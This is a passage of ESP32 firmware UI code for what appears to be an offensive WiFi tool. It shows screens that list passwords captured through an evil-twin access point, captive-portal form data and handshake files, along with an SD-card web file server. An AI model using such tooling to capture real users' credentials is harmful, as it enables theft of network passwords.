    lv_obj_set_style_pad_all(list, 8, 0);
    lv_obj_set_style_pad_gap(list, 4, 0);
    lv_obj_set_flex_flow(list, LV_FLEX_FLOW_COLUMN);
    lv_obj_set_scrollbar_mode(list, LV_SCROLLBAR_MODE_AUTO);
    
    int count = sd_cache_get_eviltwin_count();
    
    for (int i = 0; i < count && i < 50; i++) {
        const char *line = sd_cache_get_eviltwin_entry(i);
        if (line == NULL || strlen(line) == 0) continue;
        
        // Parse: "SSID", "password"
        char ssid[64] = {0};
        char password[64] = {0};
        const char *p = line;
        
        // Find first opening quote for SSID
        while (*p && *p != '"') p++;
        if (*p == '"') p++;  // Skip opening quote
        const char *ssid_start = p;
        while (*p && *p != '"') p++;
        size_t ssid_len = p - ssid_start;
        if (ssid_len > sizeof(ssid) - 1) ssid_len = sizeof(ssid) - 1;
        strncpy(ssid, ssid_start, ssid_len);
        
        // Skip closing quote of SSID, then find opening quote of password
        if (*p == '"') p++;  // Skip closing quote of SSID
        while (*p && *p != '"') p++;  // Skip comma, spaces until next quote
        if (*p == '"') p++;  // Skip opening quote of password
        const char *pass_start = p;
        while (*p && *p != '"') p++;
        size_t pass_len = p - pass_start;
        if (pass_len > sizeof(password) - 1) pass_len = sizeof(password) - 1;
        strncpy(password, pass_start, pass_len);
        
        // Create clickable button for each entry
        lv_obj_t *btn = lv_btn_create(list);
        lv_obj_set_size(btn, lv_pct(100), 40);
        lv_obj_set_style_bg_color(btn, ui_card_color(), LV_STATE_DEFAULT);
        lv_obj_set_style_bg_color(btn, lv_color_make(50, 50, 50), LV_STATE_PRESSED);
        lv_obj_set_style_border_color(btn, ui_accent_color(), 0);
        lv_obj_set_style_border_width(btn, 1, 0);
        lv_obj_set_style_radius(btn, 4, 0);
        
        lv_obj_t *lbl = lv_label_create(btn);
        char display_text[140];
        snprintf(display_text, sizeof(display_text), "%s: %s", ssid, password);
        lv_label_set_text(lbl, display_text);
        lv_obj_set_style_text_color(lbl, ui_text_color(), 0);
        lv_obj_set_style_text_font(lbl, &lv_font_montserrat_12, 0);
        lv_obj_align(lbl, LV_ALIGN_LEFT_MID, 5, 0);
        lv_label_set_long_mode(lbl, LV_LABEL_LONG_SCROLL_CIRCULAR);
        lv_obj_set_width(lbl, lv_pct(90));
    }
    
    if (count == 0) {
        lv_obj_t *msg_label = lv_label_create(list);
        lv_label_set_text(msg_label, "No passwords captured yet.");
        lv_obj_set_style_text_color(msg_label, ui_text_color(), 0);
        lv_obj_set_style_text_font(msg_label, &lv_font_montserrat_14, 0);
    }
}

// Portal Data screen - uses cached data from PSRAM
static void show_portal_data_screen(void)
{
    create_function_page_base("Portal Data");
    
    // Scrollable list container
    lv_obj_t *list = lv_obj_create(function_page);
    lv_obj_set_size(list, lv_pct(100), LCD_V_RES - 30);
    lv_obj_align(list, LV_ALIGN_BOTTOM_MID, 0, 0);
    lv_obj_set_style_bg_color(list, ui_bg_color(), 0);
    lv_obj_set_style_border_width(list, 0, 0);
    lv_obj_set_style_pad_all(list, 8, 0);
    lv_obj_set_style_pad_gap(list, 4, 0);
    lv_obj_set_flex_flow(list, LV_FLEX_FLOW_COLUMN);
    lv_obj_set_scrollbar_mode(list, LV_SCROLLBAR_MODE_AUTO);
    
    int count = sd_cache_get_portal_count();
    
    for (int i = 0; i < count && i < 50; i++) {
        const char *line = sd_cache_get_portal_entry(i);
        if (line == NULL || strlen(line) == 0) continue;
        
        // Display the whole line (already in readable format from portals.txt)
        // Format: "SSID", "field1=value1", "field2=value2", ...
        
        // Create clickable button for each entry
        lv_obj_t *btn = lv_btn_create(list);
        lv_obj_set_size(btn, lv_pct(100), 50);
        lv_obj_set_style_bg_color(btn, ui_card_color(), LV_STATE_DEFAULT);
        lv_obj_set_style_bg_color(btn, lv_color_make(50, 50, 50), LV_STATE_PRESSED);
        lv_obj_set_style_border_color(btn, COLOR_MATERIAL_PURPLE, 0);
        lv_obj_set_style_border_width(btn, 1, 0);
        lv_obj_set_style_radius(btn, 4, 0);
        
        lv_obj_t *lbl = lv_label_create(btn);
        lv_label_set_text(lbl, line);
        lv_obj_set_style_text_color(lbl, ui_text_color(), 0);
        lv_obj_set_style_text_font(lbl, &lv_font_montserrat_12, 0);
        lv_obj_align(lbl, LV_ALIGN_LEFT_MID, 5, 0);
        lv_label_set_long_mode(lbl, LV_LABEL_LONG_SCROLL_CIRCULAR);
        lv_obj_set_width(lbl, lv_pct(90));
    }
    
    if (count == 0) {
        lv_obj_t *msg_label = lv_label_create(list);
        lv_label_set_text(msg_label, "No portal data captured yet.");
        lv_obj_set_style_text_color(msg_label, ui_text_color(), 0);
        lv_obj_set_style_text_font(msg_label, &lv_font_montserrat_14, 0);
    }
}

// Handshakes list screen - uses cached data from PSRAM
static void show_handshakes_list_screen(void)
{
    create_function_page_base("Handshakes");
    
    // Scrollable list container
    lv_obj_t *list = lv_obj_create(function_page);
    lv_obj_set_size(list, lv_pct(100), LCD_V_RES - 30);
    lv_obj_align(list, LV_ALIGN_BOTTOM_MID, 0, 0);
    lv_obj_set_style_bg_color(list, ui_bg_color(), 0);
    lv_obj_set_style_border_width(list, 0, 0);
    lv_obj_set_style_pad_all(list, 8, 0);
    lv_obj_set_style_pad_gap(list, 4, 0);
    lv_obj_set_flex_flow(list, LV_FLEX_FLOW_COLUMN);
    lv_obj_set_scrollbar_mode(list, LV_SCROLLBAR_MODE_AUTO);
    
    int count = sd_cache_get_handshake_count();
    
    for (int i = 0; i < count && i < 50; i++) {
        const char *name = sd_cache_get_handshake_name(i);
        if (name == NULL) continue;
        
        // Create clickable button for each pcap file
        lv_obj_t *btn = lv_btn_create(list);
        lv_obj_set_size(btn, lv_pct(100), 40);
        lv_obj_set_style_bg_color(btn, ui_card_color(), LV_STATE_DEFAULT);
        lv_obj_set_style_bg_color(btn, lv_color_make(50, 50, 50), LV_STATE_PRESSED);
        lv_obj_set_style_border_color(btn, COLOR_MATERIAL_AMBER, 0);
        lv_obj_set_style_border_width(btn, 1, 0);
        lv_obj_set_style_radius(btn, 4, 0);
        
        lv_obj_t *lbl = lv_label_create(btn);
        lv_label_set_text(lbl, name);
        lv_obj_set_style_text_color(lbl, ui_text_color(), 0);
        lv_obj_set_style_text_font(lbl, &lv_font_montserrat_12, 0);
        lv_obj_align(lbl, LV_ALIGN_LEFT_MID, 5, 0);
        lv_label_set_long_mode(lbl, LV_LABEL_LONG_SCROLL_CIRCULAR);
        lv_obj_set_width(lbl, lv_pct(90));
    }
    
    if (count == 0) {
        lv_obj_t *msg_label = lv_label_create(list);
        lv_label_set_text(msg_label, "No handshakes captured yet.");
        lv_obj_set_style_text_color(msg_label, ui_text_color(), 0);
        lv_obj_set_style_text_font(msg_label, &lv_font_montserrat_14, 0);
    }
}

// Download Mode - Force bootloader restart
void GoToDownloadMode(void)
{
    // For ESP32C5, use LP_AON_SYS_CFG_REG
    // LP_AON_FORCE_DOWNLOAD_BOOT[30:29] = 0x1 for download boot0 (UART/USB)
    REG_SET_FIELD(LP_AON_SYS_CFG_REG, LP_AON_FORCE_DOWNLOAD_BOOT, 1);
    esp_restart();
}

// Timer callback for download mode restart
static void download_mode_timer_cb(void *arg)
{
    GoToDownloadMode();
}

// Download Mode confirmation dialog callback
static void download_mode_confirm_cb(lv_event_t *e)
{
    // Clear screen and show DOWNLOAD MODE message
    lv_obj_clean(lv_scr_act());
    
    lv_obj_t *download_label = lv_label_create(lv_scr_act());
    lv_label_set_text(download_label, "DOWNLOAD MODE");
    lv_obj_set_style_text_font(download_label, &lv_font_montserrat_20, 0);
    lv_obj_set_style_text_color(download_label, COLOR_MATERIAL_RED, 0);
    lv_obj_center(download_label);
    
    // Use timer to delay restart, allowing LVGL to refresh
    const esp_timer_create_args_t timer_args = {
        .callback = download_mode_timer_cb,
        .arg = NULL,
        .name = "download_mode_timer"
    };
    esp_timer_handle_t timer;
    esp_timer_create(&timer_args, &timer);
    esp_timer_start_once(timer, 1500000);  // 1.5 seconds in microseconds
}

// Download Mode cancel callback
static void download_mode_cancel_cb(lv_event_t *e)
{
    show_settings_screen();
}

// Download Mode screen - show confirmation and execute restart
static void show_download_mode_screen(void)
{
    create_function_page_base("Download Mode");
    
    lv_obj_t *warning_label = lv_label_create(function_page);
    lv_label_set_text(warning_label, "Download Mode\n\nThis will restart the device\ninto bootloader mode.\n\nAre you sure?");
    lv_obj_set_style_text_align(warning_label, LV_TEXT_ALIGN_CENTER, 0);
    lv_obj_set_style_text_color(warning_label, ui_text_color(), 0);
    lv_obj_set_style_text_font(warning_label, &lv_font_montserrat_16, 0);
    lv_obj_center(warning_label);
    
    lv_obj_t *btn_bar = lv_obj_create(function_page);
    lv_obj_set_size(btn_bar, lv_pct(100), 50);
    lv_obj_align(btn_bar, LV_ALIGN_BOTTOM_MID, 0, -15);
    lv_obj_set_style_bg_color(btn_bar, ui_bg_color(), 0);
    lv_obj_set_style_border_width(btn_bar, 0, 0);
    lv_obj_clear_flag(btn_bar, LV_OBJ_FLAG_SCROLLABLE);
    lv_obj_set_flex_flow(btn_bar, LV_FLEX_FLOW_ROW);
    lv_obj_set_style_pad_all(btn_bar, 4, 0);
    lv_obj_set_style_pad_gap(btn_bar, 4, 0);
    
    lv_obj_t *cancel_btn = lv_btn_create(btn_bar);
    lv_obj_set_size(cancel_btn, 90, 32);
    lv_obj_set_style_bg_color(cancel_btn, COLOR_MATERIAL_TEAL, LV_STATE_DEFAULT);
    lv_obj_set_style_bg_color(cancel_btn, lv_color_lighten(COLOR_MATERIAL_TEAL, 30), LV_STATE_PRESSED);
    lv_obj_set_style_border_width(cancel_btn, 0, 0);
    lv_obj_set_style_radius(cancel_btn, 8, 0);
    lv_obj_t *cancel_lbl = lv_label_create(cancel_btn);
    lv_label_set_text(cancel_lbl, "BACK");
    lv_obj_set_style_text_color(cancel_lbl, ui_text_color(), 0);
    lv_obj_center(cancel_lbl);
    lv_obj_add_event_cb(cancel_btn, download_mode_cancel_cb, LV_EVENT_CLICKED, NULL);
    
    lv_obj_t *confirm_btn = lv_btn_create(btn_bar);
    lv_obj_set_size(confirm_btn, 90, 32);
    lv_obj_set_style_bg_color(confirm_btn, COLOR_MATERIAL_RED, LV_STATE_DEFAULT);
    lv_obj_set_style_bg_color(confirm_btn, lv_color_lighten(COLOR_MATERIAL_RED, 30), LV_STATE_PRESSED);
    lv_obj_set_style_border_width(confirm_btn, 0, 0);
    lv_obj_set_style_radius(confirm_btn, 8, 0);
    lv_obj_t *confirm_lbl = lv_label_create(confirm_btn);
    lv_label_set_text(confirm_lbl, "RESTART");
    lv_obj_set_style_text_color(confirm_lbl, ui_text_color(), 0);
    lv_obj_center(confirm_lbl);
    lv_obj_add_event_cb(confirm_btn, download_mode_confirm_cb, LV_EVENT_CLICKED, NULL);
}

// ============================================================================
// GATT Connect Timeout Popup
// ============================================================================

static lv_obj_t *gatt_tmo_popup  = NULL;
static lv_obj_t *gatt_tmo_slider = NULL;
static lv_obj_t *gatt_tmo_label  = NULL;

static void gatt_tmo_slider_cb(lv_event_t *e)
{
    (void)e;
    if (!gatt_tmo_slider || !gatt_tmo_label) return;
    int32_t val = lv_slider_get_value(gatt_tmo_slider);
    char buf[36];
    snprintf(buf, sizeof(buf), "Timeout: %ldms", (long)val);
    lv_label_set_text(gatt_tmo_label, buf);
}

static void gatt_tmo_popup_close_cb(lv_event_t *e)
{
    (void)e;
    if (gatt_tmo_popup) { lv_obj_del(gatt_tmo_popup); gatt_tmo_popup = NULL; }
    gatt_tmo_slider = NULL;
    gatt_tmo_label  = NULL;
}

static void gatt_tmo_popup_save_cb(lv_event_t *e)
{
    if (!gatt_tmo_slider) return;
    uint32_t val = (uint32_t)lv_slider_get_value(gatt_tmo_slider);
    g_gatt_timeout_ms = val;
    gw_set_timeout(val);
    nvs_settings_save_gatt_timeout(val);
    gatt_tmo_popup_close_cb(e);
}

static void show_gatt_timeout_popup(void)
{
    if (gatt_tmo_popup) return;

    gatt_tmo_popup = lv_obj_create(lv_scr_act());
    lv_obj_set_size(gatt_tmo_popup, LCD_H_RES, LCD_V_RES);
    lv_obj_set_pos(gatt_tmo_popup, 0, 0);
    lv_obj_set_style_bg_color(gatt_tmo_popup, ui_bg_color(), 0);
    lv_obj_set_style_bg_opa(gatt_tmo_popup, LV_OPA_70, 0);
    lv_obj_set_style_border_width(gatt_tmo_popup, 0, 0);
    lv_obj_set_style_radius(gatt_tmo_popup, 0, 0);
    lv_obj_clear_flag(gatt_tmo_popup, LV_OBJ_FLAG_SCROLLABLE);
    lv_obj_add_flag(gatt_tmo_popup, LV_OBJ_FLAG_CLICKABLE);

    lv_obj_t *dialog = lv_obj_create(gatt_tmo_popup);
    lv_obj_set_size(dialog, 220, LV_SIZE_CONTENT);
    lv_obj_center(dialog);
    lv_obj_set_style_bg_color(dialog, ui_panel_color(), 0);
    lv_obj_set_style_border_color(dialog, UI_ACCENT_CYAN, 0);
    lv_obj_set_style_border_width(dialog, 2, 0);
    lv_obj_set_style_radius(dialog, 12, 0);
    lv_obj_clear_flag(dialog, LV_OBJ_FLAG_SCROLLABLE);
    lv_obj_set_flex_flow(dialog, LV_FLEX_FLOW_COLUMN);
    lv_obj_set_flex_align(dialog, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
    lv_obj_set_style_pad_all(dialog, 10, 0);
    lv_obj_set_style_pad_gap(dialog, 6, 0);

    lv_obj_t *title = lv_label_create(dialog);
    lv_label_set_text(title, "GATT Connect Timeout");
    lv_obj_set_style_text_color(title, ui_text_color(), 0);
    lv_obj_set_style_text_font(title, &lv_font_montserrat_14, 0);

    gatt_tmo_label = lv_label_create(dialog);
    char buf[36];
    snprintf(buf, sizeof(buf), "Timeout: %ums", (unsigned)g_gatt_timeout_ms);
    lv_label_set_text(gatt_tmo_label, buf);
    lv_obj_set_style_text_color(gatt_tmo_label, UI_ACCENT_CYAN, 0);
    lv_obj_set_style_text_font(gatt_tmo_label, &lv_font_montserrat_12, 0);

    gatt_tmo_slider = lv_slider_create(dialog);
    lv_obj_set_width(gatt_tmo_slider, 196);
    lv_slider_set_range(gatt_tmo_slider, 3000, 30000);
    lv_slider_set_value(gatt_tmo_slider, (int32_t)g_gatt_timeout_ms, LV_ANIM_OFF);
    lv_obj_set_style_bg_color(gatt_tmo_slider, lv_color_make(80, 80, 80), LV_PART_MAIN);
    lv_obj_set_style_bg_color(gatt_tmo_slider, UI_ACCENT_CYAN, LV_PART_INDICATOR);
    lv_obj_set_style_bg_color(gatt_tmo_slider, UI_ACCENT_CYAN, LV_PART_KNOB);
    lv_obj_set_style_pad_all(gatt_tmo_slider, 4, LV_PART_KNOB);
    lv_obj_add_event_cb(gatt_tmo_slider, gatt_tmo_slider_cb, LV_EVENT_VALUE_CHANGED, NULL);

    lv_obj_t *note = lv_label_create(dialog);
    lv_label_set_text(note, "3s = fast  |  30s = patient");
    lv_obj_set_style_text_color(note, ui_muted_color(), 0);
    lv_obj_set_style_text_font(note, &lv_font_montserrat_12, 0);

    lv_obj_t *btn_row = lv_obj_create(dialog);
    lv_obj_set_size(btn_row, 196, 36);
    lv_obj_set_style_bg_opa(btn_row, LV_OPA_TRANSP, 0);
    lv_obj_set_style_border_width(btn_row, 0, 0);
    lv_obj_set_style_pad_all(btn_row, 0, 0);
    lv_obj_clear_flag(btn_row, LV_OBJ_FLAG_SCROLLABLE);
    lv_obj_set_flex_flow(btn_row, LV_FLEX_FLOW_ROW);
    lv_obj_set_flex_align(btn_row, LV_FLEX_ALIGN_SPACE_EVENLY, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);

    lv_obj_t *cancel_btn = lv_btn_create(btn_row);
    lv_obj_set_size(cancel_btn, 90, 30);
    lv_obj_set_style_bg_color(cancel_btn, lv_color_make(80, 80, 80), 0);
    lv_obj_set_style_radius(cancel_btn, 8, 0);
    lv_obj_t *cancel_lbl = lv_label_create(cancel_btn);
    lv_label_set_text(cancel_lbl, "Cancel");
    lv_obj_set_style_text_color(cancel_lbl, ui_text_color(), 0);
    lv_obj_set_style_text_font(cancel_lbl, &lv_font_montserrat_12, 0);
    lv_obj_center(cancel_lbl);
    lv_obj_add_event_cb(cancel_btn, gatt_tmo_popup_close_cb, LV_EVENT_CLICKED, NULL);

    lv_obj_t *save_btn = lv_btn_create(btn_row);
    lv_obj_set_size(save_btn, 90, 30);
    lv_obj_set_style_bg_color(save_btn, UI_ACCENT_CYAN, 0);
    lv_obj_set_style_bg_color(save_btn, lv_color_lighten(UI_ACCENT_CYAN, 30), LV_STATE_PRESSED);
    lv_obj_set_style_radius(save_btn, 8, 0);
    lv_obj_t *save_lbl = lv_label_create(save_btn);
    lv_label_set_text(save_lbl, "Save");
    lv_obj_set_style_text_color(save_lbl, lv_color_black(), 0);
    lv_obj_set_style_text_font(save_lbl, &lv_font_montserrat_12, 0);
    lv_obj_center(save_lbl);
    lv_obj_add_event_cb(save_btn, gatt_tmo_popup_save_cb, LV_EVENT_CLICKED, NULL);
}

// ============================================================================
// WiFi File Server — HTTP handlers (AP and STA modes)
// ============================================================================

static httpd_handle_t s_fileserv_httpd  = NULL;
static bool           s_fileserv_active = false;
static lv_obj_t      *s_fileserv_ip_lbl = NULL;
static lv_obj_t      *s_fileserv_status_lbl = NULL;
static lv_timer_t    *s_fileserv_poll_timer = NULL;

/* Stream a file from SD to HTTP response in 4 KB chunks. */
static void s_fileserv_send_file(httpd_req_t *req, const char *path)
{
    FILE *f = fopen(path, "rb");
    if (!f) { httpd_resp_send_err(req, HTTPD_404_NOT_FOUND, "File not found"); return; }

    const char *ext = strrchr(path, '.');
    if      (ext && strcasecmp(ext, ".json") == 0) httpd_resp_set_type(req, "application/json");
    else if (ext && strcasecmp(ext, ".csv")  == 0) httpd_resp_set_type(req, "text/csv");
    else if (ext && strcasecmp(ext, ".txt")  == 0) httpd_resp_set_type(req, "text/plain");
    else if (ext && strcasecmp(ext, ".html") == 0) httpd_resp_set_type(req, "text/html");
    else                                            httpd_resp_set_type(req, "application/octet-stream");
    httpd_resp_set_hdr(req, "Content-Disposition", "inline");

    char *buf = malloc(4096);
    if (!buf) { fclose(f); httpd_resp_send_err(req, HTTPD_500_INTERNAL_SERVER_ERROR, "OOM"); return; }
    size_t n;
    while ((n = fread(buf, 1, 4096, f)) > 0) {
        if (httpd_resp_send_chunk(req, buf, n) != ESP_OK) break;
    }
    httpd_resp_send_chunk(req, NULL, 0);
    free(buf);
    fclose(f);
}

/* Send an HTML directory listing for sd_path, with URL base url_path. */
static void s_fileserv_send_dir(httpd_req_t *req, const char *sd_path, const char *url_path)
{
    DIR *d = opendir(sd_path);
    if (!d) { httpd_resp_send_err(req, HTTPD_404_NOT_FOUND, "Directory not found"); return; }

    httpd_resp_set_type(req, "text/html; charset=utf-8");

    char chunk[512];
    snprintf(chunk, sizeof(chunk),
        "<!DOCTYPE html><html><head><meta charset='utf-8'>"
        "<meta name='viewport' content='width=device-width'>"
        "<title>JANOS</title></head>"
        "<body style='font-family:monospace;background:#111;color:#0f0;padding:8px'>"
        "<h2 style='color:#0ff'>%s</h2><hr>", url_path);
    httpd_resp_send_chunk(req, chunk, strlen(chunk));

    if (strlen(url_path) > 1) {
        char parent[128];
        strncpy(parent, url_path, sizeof(parent) - 1);
        parent[sizeof(parent)-1] = '\0';
        char *sl = strrchr(parent, '/');
        if (sl && sl != parent) *sl = '\0'; else strcpy(parent, "/");
        int n = snprintf(chunk, sizeof(chunk),
            "<p><a href='/files%s' style='color:#0ff'>[..] Parent</a></p>", parent);
        if (n > 0 && n < (int)sizeof(chunk)) httpd_resp_send_chunk(req, chunk, n);
    }

    struct dirent *e;
    while ((e = readdir(d)) != NULL) {
        char entry_sd[260];
        snprintf(entry_sd, sizeof(entry_sd), "%s/%.200s", sd_path, e->d_name);
        const char *sep = (url_path[strlen(url_path)-1] == '/') ? "" : "/";
        struct stat st;
        memset(&st, 0, sizeof(st));
        stat(entry_sd, &st);
        int n;
        if (S_ISDIR(st.st_mode)) {
            n = snprintf(chunk, sizeof(chunk),
                "<p><a href='/files%s%s%.100s' style='color:#ff0'>[DIR] %.100s</a></p>",
                url_path, sep, e->d_name, e->d_name);
        } else {
            n = snprintf(chunk, sizeof(chunk),
                "<p><a href='/files%s%s%.100s' style='color:#0f0'>%.100s</a>"
                " <span style='color:#888'>(%ld B)</span></p>",
                url_path, sep, e->d_name, e->d_name, (long)st.st_size);
        }
        if (n > 0 && n < (int)sizeof(chunk)) httpd_resp_send_chunk(req, chunk, n);
    }
    closedir(d);
    const char *foot = "<hr><small style='color:#555'>JANOS CYM-NM28C5</small></body></html>";
    httpd_resp_send_chunk(req, foot, strlen(foot));
    httpd_resp_send_chunk(req, NULL, 0);
}

static esp_err_t fileserv_root_handler(httpd_req_t *req)
{
    /* Strip /files prefix; everything else is treated as a path under /sdcard */
    const char *uri = req->uri;
    const char *url_path = uri;
    if (strncmp(uri, "/files", 6) == 0) url_path = uri + 6;
    if (*url_path == '\0') url_path = "/";

    char sd_path[256];
    snprintf(sd_path, sizeof(sd_path), "/sdcard%.240s", url_path);
    size_t pl = strlen(sd_path);
    if (pl > 1 && sd_path[pl-1] == '/') sd_path[pl-1] = '\0';

    struct stat st;
    memset(&st, 0, sizeof(st));
    if (stat(sd_path, &st) != 0) {
        if (strcmp(url_path, "/") == 0) {
            strcpy(sd_path, "/sdcard");
            stat(sd_path, &st);
        } else {
            httpd_resp_send_err(req, HTTPD_404_NOT_FOUND, "Not found");
            return ESP_OK;
        }
    }
    if (S_ISDIR(st.st_mode)) s_fileserv_send_dir(req, sd_path, url_path);
    else                      s_fileserv_send_file(req, sd_path);
    return ESP_OK;
}

static bool s_fileserv_httpd_start(void)
{
    if (s_fileserv_httpd) return true;
    httpd_config_t cfg = HTTPD_DEFAULT_CONFIG();
    cfg.server_port      = 80;
    cfg.max_open_sockets = 5;
    cfg.max_uri_handlers = 4;
    cfg.uri_match_fn     = httpd_uri_match_wildcard;
    cfg.lru_purge_enable = true;
    if (httpd_start(&s_fileserv_httpd, &cfg) != ESP_OK) return false;
    httpd_uri_t handler = { .uri="/*", .method=HTTP_GET,
                            .handler=fileserv_root_handler, .user_ctx=NULL };
    httpd_register_uri_handler(s_fileserv_httpd, &handler);
    s_fileserv_active = true;
    return true;
}

static void s_fileserv_httpd_stop(void)
{
    if (s_fileserv_httpd) { httpd_stop(s_fileserv_httpd); s_fileserv_httpd = NULL; }
    s_fileserv_active = false;
}

/* Poll timer: update IP label once STA gets an address. */
static void s_fileserv_poll_ip_cb(lv_timer_t *t)
{
    esp_netif_t *netif = esp_netif_get_handle_from_ifkey("WIFI_STA_DEF");
    if (!netif) return;
    esp_netif_ip_info_t ip;
    if (esp_netif_get_ip_info(netif, &ip) == ESP_OK && ip.ip.addr != 0) {
        char ip_str[64];
        snprintf(ip_str, sizeof(ip_str), "IP: " IPSTR " => http://" IPSTR,
                 IP2STR(&ip.ip), IP2STR(&ip.ip));
        if (s_fileserv_ip_lbl)     lv_label_set_text(s_fileserv_ip_lbl, ip_str);
        if (s_fileserv_status_lbl) lv_label_set_text(s_fileserv_status_lbl, "Server active");
        s_fileserv_httpd_start();
        lv_timer_del(t);
        s_fileserv_poll_timer = NULL;
    }
}

/* Shared stop callback — stops HTTP server and optionally rejoins WiFi scan mode. */
static void s_fileserv_stop_cb(lv_event_t *e)
{
    (void)e;
    if (s_fileserv_poll_timer) { lv_timer_del(s_fileserv_poll_timer); s_fileserv_poll_timer = NULL; }
    s_fileserv_httpd_stop();
    show_settings_screen();
}

// ── AP File Server screen ────────────────────────────────────────────────────

static void show_ap_file_server_screen(void)
{
    create_function_page_base("AP File Server");
    apply_menu_bg();

    // Info card
    lv_obj_t *card = lv_obj_create(function_page);
    lv_obj_set_size(card, 220, LV_SIZE_CONTENT);
    lv_obj_align(card, LV_ALIGN_TOP_MID, 0, 36);
    lv_obj_set_style_bg_color(card, ui_panel_color(), 0);
    lv_obj_set_style_border_color(card, UI_ACCENT_CYAN, 0);
    lv_obj_set_style_border_width(card, 1, 0);
    lv_obj_set_style_radius(card, 8, 0);
    lv_obj_set_style_pad_all(card, 8, 0);
    lv_obj_set_style_pad_gap(card, 4, 0);
    lv_obj_clear_flag(card, LV_OBJ_FLAG_SCROLLABLE);
    lv_obj_set_flex_flow(card, LV_FLEX_FLOW_COLUMN);

    /* Row helper — label on left, value on right */
    #define AP_INFO_ROW(parent, ltext, vtext, vcol) do { \
        lv_obj_t *row = lv_obj_create(parent); \
        lv_obj_set_width(row, lv_pct(100)); \
        lv_obj_set_height(row, LV_SIZE_CONTENT); \
        lv_obj_set_style_bg_opa(row, LV_OPA_TRANSP, 0); \
        lv_obj_set_style_border_width(row, 0, 0); \
        lv_obj_set_style_pad_all(row, 2, 0); \
        lv_obj_clear_flag(row, LV_OBJ_FLAG_SCROLLABLE); \
        lv_obj_t *_ll = lv_label_create(row); \
        lv_label_set_text(_ll, ltext); \
        lv_obj_set_style_text_font(_ll, &lv_font_montserrat_12, 0); \
        lv_obj_set_style_text_color(_ll, lv_color_make(150,150,150), 0); \
        lv_obj_align(_ll, LV_ALIGN_LEFT_MID, 0, 0); \
        lv_obj_t *_vl = lv_label_create(row); \
        lv_label_set_text(_vl, vtext); \
        lv_obj_set_style_text_font(_vl, &lv_font_montserrat_12, 0); \
        lv_obj_set_style_text_color(_vl, vcol, 0); \
        lv_obj_align(_vl, LV_ALIGN_RIGHT_MID, 0, 0); \
    } while(0)

    AP_INFO_ROW(card, "SSID:",     "TheLab",            lv_color_make(0,255,0));
    AP_INFO_ROW(card, "Pass:",     "Do not touch!",     lv_color_make(255,200,0));
    AP_INFO_ROW(card, "URL:",      "http://192.168.4.1", UI_ACCENT_CYAN);
    #undef AP_INFO_ROW

    s_fileserv_status_lbl = lv_label_create(function_page);
    lv_label_set_text(s_fileserv_status_lbl, "Starting AP...");
    lv_obj_set_style_text_color(s_fileserv_status_lbl, UI_ACCENT_CYAN, 0);
    lv_obj_set_style_text_font(s_fileserv_status_lbl, &lv_font_montserrat_12, 0);
    lv_obj_align(s_fileserv_status_lbl, LV_ALIGN_TOP_MID, 0, 175);

    lv_obj_t *stop_btn = lv_btn_create(function_page);
    lv_obj_set_size(stop_btn, 110, 34);
    lv_obj_align(stop_btn, LV_ALIGN_BOTTOM_MID, 0, -8);
    lv_obj_set_style_bg_color(stop_btn, COLOR_MATERIAL_RED, 0);
    lv_obj_set_style_bg_color(stop_btn, lv_color_lighten(COLOR_MATERIAL_RED, 30), LV_STATE_PRESSED);
    lv_obj_set_style_radius(stop_btn, 8, 0);
    lv_obj_t *stop_lbl = lv_label_create(stop_btn);
    lv_label_set_text(stop_lbl, LV_SYMBOL_CLOSE "  Stop");
    lv_obj_set_style_text_font(stop_lbl, &lv_font_montserrat_12, 0);
    lv_obj_set_style_text_color(stop_lbl, lv_color_white(), 0);
    lv_obj_center(stop_lbl);
    lv_obj_add_event_cb(stop_btn, s_fileserv_stop_cb, LV_EVENT_CLICKED, NULL);

    /* Start the AP and HTTP server */
    ensure_wifi_mode();
    wifi_mode_t wmode;
    esp_wifi_get_mode(&wmode);
    if (wmode != WIFI_MODE_APSTA && wmode != WIFI_MODE_AP) {
        esp_wifi_set_mode(WIFI_MODE_APSTA);
        vTaskDelay(pdMS_TO_TICKS(100));
    }
    wifi_config_t ap_cfg = {
        .ap = {
            .ssid         = "TheLab",
            .ssid_len     = 6,
            .password     = "Do not touch!",
            .channel      = 6,
            .max_connection = 4,
            .authmode     = WIFI_AUTH_WPA2_PSK,
        }
    };
    esp_wifi_set_config(WIFI_IF_AP, &ap_cfg);
    vTaskDelay(pdMS_TO_TICKS(200));

    if (s_fileserv_httpd_start()) {
        lv_label_set_text(s_fileserv_status_lbl, "Active — connect to TheLab");
    } else {
        lv_label_set_text(s_fileserv_status_lbl, "HTTP start failed");
    }
}

// ── WiFi Client File Server screen ───────────────────────────────────────────

static lv_obj_t *s_wcs_ssid_ta   = NULL;
static lv_obj_t *s_wcs_pass_ta   = NULL;
static lv_obj_t *s_wcs_keyboard  = NULL;
static lv_obj_t *s_wcs_active_ta = NULL;

static void s_wcs_ta_focus_cb(lv_event_t *e)
{
    lv_obj_t *ta = lv_event_get_target(e);
    s_wcs_active_ta = ta;
    if (s_wcs_keyboard) {
        lv_keyboard_set_textarea(s_wcs_keyboard, ta);
        lv_obj_clear_flag(s_wcs_keyboard, LV_OBJ_FLAG_HIDDEN);
    }
}

static void s_wcs_kb_event_cb(lv_event_t *e)
{
    lv_event_code_t code = lv_event_get_code(e);
    if (code == LV_EVENT_READY || code == LV_EVENT_CANCEL) {
        if (s_wcs_keyboard) lv_obj_add_flag(s_wcs_keyboard, LV_OBJ_FLAG_HIDDEN);
    }
}

static void s_wcs_connect_cb(lv_event_t *e)
{
    (void)e;
    if (!s_wcs_ssid_ta || !s_wcs_pass_ta) return;
    const char *ssid = lv_textarea_get_text(s_wcs_ssid_ta);
    const char *pass = lv_textarea_get_text(s_wcs_pass_ta);

    strncpy(g_saved_wifi_ssid, ssid, sizeof(g_saved_wifi_ssid) - 1);
    strncpy(g_saved_wifi_pass, pass, sizeof(g_saved_wifi_pass) - 1);
    nvs_settings_save_wifi_creds(ssid, pass);

    if (s_fileserv_status_lbl) lv_label_set_text(s_fileserv_status_lbl, "Connecting...");
    if (s_fileserv_ip_lbl)     lv_label_set_text(s_fileserv_ip_lbl, "Waiting for IP...");

    ensure_wifi_mode();
    wifi_config_t sta_cfg = {};
    strncpy((char *)sta_cfg.sta.ssid,     ssid, sizeof(sta_cfg.sta.ssid) - 1);
    strncpy((char *)sta_cfg.sta.password, pass, sizeof(sta_cfg.sta.password) - 1);
